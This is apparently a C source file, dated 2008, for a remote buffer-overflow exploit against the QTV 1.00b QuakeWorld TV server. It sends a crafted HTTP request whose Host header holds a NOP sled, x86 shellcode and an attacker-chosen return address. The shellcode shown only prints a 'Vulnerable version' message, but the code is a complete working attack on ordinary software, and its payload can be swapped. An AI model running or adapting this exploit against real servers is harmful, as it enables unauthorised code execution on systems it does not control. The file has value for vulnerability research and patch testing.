/*
 * mi.c
 * Remote exploit for QTV 1.00b and probably earlier versions as well
 * QTV URL: http://qw-dev.net/projects/show/qtv
 * Example usage: ./mi 127.0.0.1 28000 -559038737
 * Copyright Oscar Linderholm, 2008, osclin at gmail
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <netdb.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <sys/socket.h>

int main(int argc, char *argv[])
{
  int sock, port, offset[4];
  char payload[120], *qtv;
  long temp;
  struct sockaddr_in addr;

  if (argc != 4)
  {
    printf("Usage: %s <QTV ip> <port> <offset>\n", argv[0]);
    return 0;
  }

  qtv = argv[1];
  port = atoi(argv[2]);
  temp = atol(argv[3]);

  offset[0] = temp << 24 >> 24;
  offset[1] = temp << 16 >> 24;
  offset[2] = temp << 8 >> 24;
  offset[3] = temp >> 24;

  if ((sock = socket(AF_INET, SOCK_STREAM, 0)) == -1)
  {
    perror("socket");
    return -1;
  }

  addr.sin_family = AF_INET;
  addr.sin_addr.s_addr = inet_addr(qtv);
  addr.sin_port = htons(port);
  memset(addr.sin_zero, '\0', sizeof(addr.sin_zero));

  if (connect(sock, (struct sockaddr *)&addr, sizeof(addr)) == -1)
  {
    perror("connect");
    return -1;
  }

  memset(payload, '\0', 120);
  sprintf(payload, "\x47\x45\x54\x20\x2f\x77\x61\x74\x63\x68\x2e\x71"
       "\x74\x76\x3f\x73\x69\x64\x3d\x31\x0d\x0a\x48\x6f"
       "\x73\x74\x3a\x20\x90\x90\x90\x90\x90\x90\x90\x90"
       "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
       "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\xeb"
       "\x13\x59\x29\xc0\xb0\x04\x29\xdb\x43\x29\xd2\xb2"
       "\x17\xcd\x80\x29\xc0\x40\xcd\x80\xe8\xe8\xff\xff"
       "\xff\x56\x75\x6c\x6e\x65\x72\x61\x62\x6c\x65\x20"
       "\x76\x65\x72\x73\x69\x6f\x6e\x20\x51\x54\x56\x0a"
       "%c%c%c%c\x0d\x0a\x0d\x0a",
       offset[0], offset[1], offset[2], offset[3]);

  send(sock, payload, 116, 0);
  close(sock);

  return 0;
}
